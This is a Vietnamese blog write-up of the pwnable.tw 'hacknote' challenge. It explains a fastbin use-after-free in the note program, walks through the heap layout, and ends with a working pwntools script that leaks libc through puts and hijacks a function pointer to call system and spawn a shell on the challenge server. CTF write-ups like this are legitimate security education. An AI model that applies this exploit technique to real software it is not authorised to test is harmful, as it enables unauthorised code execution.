@@ -1,0 +1,179 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Pwnable.tw] – Hacknote // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Pwnable.tw] – Hacknote"/>
+<meta name="twitter:description" content="[Pwnable.tw] – hacknote https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote.png?raw=true
+Check file và checksec ta thấy được vài điều sau:
+&#43; File binary đã bị strip và là file 32 bit &#43; Canary được bật và ngăn không có thực thi shellcode trên stack  =&gt; Chúng ta có thể dùng IDA phân tích và sử dụng address bên IDA để đặt breakpoint cho gdb khi debug.
+Sử dụng IDA xem code C t thấy được có 4 hàm chính tương tự như 4 option khi chạy thử chương trình, tuy nhiên thì tên hàm không được đặt đúng mà có cấu trúc là sub_##### nên chúng ta phải dựa vào flow của từng hàm để nhận biết các hàm."/>
+
+    <meta property="og:title" content="[Pwnable.tw] – Hacknote" />
+<meta property="og:description" content="[Pwnable.tw] – hacknote https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote.png?raw=true
+Check file và checksec ta thấy được vài điều sau:
+&#43; File binary đã bị strip và là file 32 bit &#43; Canary được bật và ngăn không có thực thi shellcode trên stack  =&gt; Chúng ta có thể dùng IDA phân tích và sử dụng address bên IDA để đặt breakpoint cho gdb khi debug.
+Sử dụng IDA xem code C t thấy được có 4 hàm chính tương tự như 4 option khi chạy thử chương trình, tuy nhiên thì tên hàm không được đặt đúng mà có cấu trúc là sub_##### nên chúng ta phải dựa vào flow của từng hàm để nhận biết các hàm." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/hacknote/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-24T03:46:08+07:00" />
+<meta property="article:modified_time" content="2021-12-24T03:46:08+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Pwnable.tw] – Hacknote</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 24, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="pwnabletw--hacknotehttpspwnabletwchallenge5">[Pwnable.tw] – <a href="https://pwnable.tw/challenge/#5">hacknote</a></h2>
+<p><a href="https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote.png?raw=true">https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote.png?raw=true</a></p>
+<p>Check file và checksec ta thấy được vài điều sau:</p>
+<pre><code>+ File binary đã bị strip và là file 32 bit
++ Canary được bật và ngăn không có thực thi shellcode trên stack
+</code></pre>
+<p>=&gt; Chúng ta có thể dùng IDA phân tích và sử dụng address bên IDA để đặt breakpoint cho gdb khi debug.</p>
+<p>Sử dụng IDA xem code C t thấy được có 4 hàm chính tương tự như 4 option khi chạy thử chương trình, tuy nhiên thì tên hàm không được đặt đúng mà có cấu trúc là sub_##### nên chúng ta phải dựa vào flow của từng hàm để nhận biết các hàm.</p>
+<p>Đầu tiên là hàm main()</p>
+<p><a href="https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_main.png?raw=true">https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_main.png?raw=true</a></p>
+<p>Hàm main sẽ nhận input và chuyển đến các hàm tương ứng</p>
+<p>Tiếp theo là hàm addnote()</p>
+<p><a href="https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_addnote.png?raw=true">https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_addnote.png?raw=true</a></p>
+<p>addnote(): thêm 1 note vào notes_list[] và mỗi khi 1 note mới được tạo sẽ có 2 câu lệnh malloc() được gọi:</p>
+<pre><code>+ notes_list[i] = malloc(8)
++ notes_list[i].content = malloc(size)
+</code></pre>
+<p>hàm tiếp là delnote()</p>
+<p><a href="https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_delnote.png?raw=true">https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_delnote.png?raw=true</a></p>
+<p>delnote(): xóa 1 note khỏi notes_list[] và mỗi khi xóa 1 note, có 2 câu lệnh free() được gọi:</p>
+<pre><code>+ free(notes_list[i].content)
++ free(notes_list[i])
+</code></pre>
+<p>hàm () or printnode()</p>
+<p>printnode(): in nội dung của note.
+show(): in nội dung của note ra màn hình.</p>
+<p><a href="https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_show.png?raw=true">https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_IDA_show.png?raw=true</a></p>
+<p>Về dạng bài như này chúng ta nên tìm hiểu qua fastbin cùng kỹ thuật mà mình được 1 người bạn chỉ cho là Use After Free :3</p>
+<h4 id="fastbinhttpsheap-exploitationdhavalkapilcomdiving_into_glibc_heapbins_chunks"><a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks">fastbin</a></h4>
+<p>Có 10 fastbin. Mỗi bin này duy trì một danh sách liên kết duy nhất. Việc thêm và xóa diễn ra từ đầu danh sách này (cách thức LIFO).
+Mỗi bin có các khối có cùng kích thước. 10 bin mỗi bin có các khối kích thước: 16, 24, 32, 40, 48, 56, 64, 72, 80 và 88. Các kích thước được đề cập ở đây cũng bao gồm siêu dữ liệu. Để lưu trữ các khối, sẽ có ít hơn 4 byte (trên nền tảng mà con trỏ sử dụng 4 byte). Chỉ trường kích thước và kích thước phổ biến của phân đoạn này sẽ chứa dữ liệu meta cho các phân đoạn được phân bổ. Kích thước của phần tiếp theo tiếp theo sẽ lưu giữ dữ liệu của người dùng.</p>
+<p>Fastbin attack là một loại phương pháp khai thác lỗ hổng đề cập đến tất cả các phương pháp khai thác lỗ hổng dựa trên cơ chế fastbin. tiền đề của việc sử dụng như vậy là:</p>
+<pre><code>+ có những lỗ hổng như tràn đống, use-after-free, v.v. kiểm soát nội dung chunk
++ lỗ hổng xảy ra trong chunk loại fastbin
+</code></pre>
+<p>Bởi vì fastbin theo cơ chế LIFO nên nhưng chuck mình mới được free() sẽ được cấp phát trước nếu mình gọi hàm malloc() đây là cốt lỗi để mình khai thác lỗi theo hướng use-after-free.</p>
+<p>Đặt breakpoint và tạo 2 note 16 byte lần lượt là AAAA và BBBB sau khi mở heap lên chúng ta sẽ thấy được có các chuck như sau:</p>
+<p><a href="https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_debug_heap.png?raw=true">https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_debug_heap.png?raw=true</a></p>
+<pre><code>+ chunk 0: notes_list[0]: 0x804b198: 8 byte đầu là header, 4 byte tiếp theo 0x0804862b là địa chỉ của hàm print_note(), 4 byte tiếp theo là địa chỉ của chunk 1 chứa notes_list[0].content. (Lưu ý: địa chỉ của chunk không tính phần header).
++ chunk 1: notes_list[0].content: 0x804b1b0: nội dung notes_list[0]: ‘AAAA’
++ chunk 2: notes_list[1]: 0x804b1c8: tương tự chunk 0.
++ chunk 3: notes_list[1].content: 0x804b1e0: nội dung notes_list[1]: ‘BBBB’
+</code></pre>
+<p>Như thế sau khi free() lần lượt list_note[0] sau đó đến list_note[1] thì fastbin sẽ cấp phát phần tiếp theo thì hệ thống sẽ lấy phần list_note[1] để lưu list_note[2] và 0x804b198 để lưu giá trị của list_note[2]. Hãy nhìn hình sau để có thể hiểu rõ hơn.</p>
+<p><a href="https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_debug_CCCC.png?raw=true">https://github.com/datnlq/Source/blob/main/Pwnable/hacknote/hacknote_debug_CCCC.png?raw=true</a></p>
+<p>Như chúng ta thấy thì địa chỉ của hàm print list_note[0] đã bị đè thành CCCC nếu ta gọi hàm show(0) thì chương trình sẽ gọi CCCC. Nếu chúng ta có thể thay thế CCCC thành system thì đã có thể gọi shell trong trường hợp này rồi.</p>
+<p>Nhưng trước hết, ta cần leak địa chỉ libc base. Ở đoạn add note 2, ta sẽ add 1 note kích thước 8 bytes nội dung là: (print_note address) + (puts_address).</p>
+<p>Khi gọi printnode(0) thì chương trình sẽ in địa chỉ hàm puts cho ta và ta đã leak được libc. :D Ngon lành liền</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+
+    libc = ELF(&#39;./libc_32.so.6&#39;)
+    #libc = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)
+    elf = ELF(&#39;./hacknote&#39;)
+
+    def addnote(size,Content):
+        io.sendlineafter(&#39;Your choice :&#39;,&#39;1&#39;)
+        io.sendlineafter(&#39;Note size :&#39;,str(size))
+        io.sendafter(&#39;Content :&#39;,Content)
+
+    def delnote(idx):
+        io.sendlineafter(&#39;Your choice :&#39;,&#39;2&#39;)
+        io.sendlineafter(&#39;Index :&#39;,str(idx))
+
+    def show(idx):
+        io.sendlineafter(&#39;Your choice :&#39;,&#39;3&#39;)
+        io.sendlineafter(&#39;Index :&#39;,str(idx))
+
+
+    def exploit():
+        addnote(0x30,&#34;A&#34;*0x30)#0
+        addnote(0x30,&#34;B&#34;*0x30)#1
+
+
+        delnote(0)  #fastbinsY[0]-&gt;chunk0
+        delnote(1)  #fastbinsY[0]-&gt;chunk1-&gt;chunk0
+
+
+        addnote(0x8,p32(0x804862b)+p32(elf.got[&#39;puts&#39;]))#2
+        show(0)
+        puts =  u32(io.recv(4))
+        print(&#34;Puts: &#34;+ hex(puts))
+        libc_base = puts - libc.symbols[&#39;puts&#39;]
+        print(&#34;Libc base: &#34;+hex(libc_base))
+        system = libc_base + libc.symbols[&#39;system&#39;]
+        print(&#34;System: &#34;+hex(system))
+
+        delnote(2) #fastbinsY[0]-&gt;chunk1-&gt;chunk0
+        addnote(0x8,p32(system)+b&#34;;sh;&#34;)#3
+        show(0)
+        io.interactive()
+
+
+    #io = process(&#39;./hacknote&#39;)
+    io = remote(&#39;chall.pwnable.tw&#39;,10102)
+    context.log_level = &#34;debug&#34;
+    exploit()
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
